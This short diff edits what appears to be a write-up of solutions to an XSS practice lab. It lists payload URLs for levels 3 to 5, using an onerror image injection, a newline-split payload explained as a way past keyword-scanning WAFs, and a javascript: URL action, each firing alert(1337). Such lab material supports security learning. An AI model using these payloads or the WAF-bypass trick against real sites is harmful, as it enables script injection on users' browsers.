@@ -5,5 +5,5 @@ Level 3: [https://zixem.altervista.org/XSS/3.php?name=zxm%0A`<img src=”x” on
   Some WAFs only scan for dangerous keywords within a single line. If an attack payload is split across multiple lines \
   (e.g., using %0A for a newline), the filter may fail to detect it, allowing bypass techniques for XSS, SQLi, and other attacks. \
 Level 4: [http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20](http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20) \
-Level 5: [https://zixem.altervista.org/XSS/5.php?name=zxm&action=javascript:alert(1337)]
+Level 5: https://zixem.altervista.org/XSS/5.php?name=zxm&action=javascript:alert(1337)
 
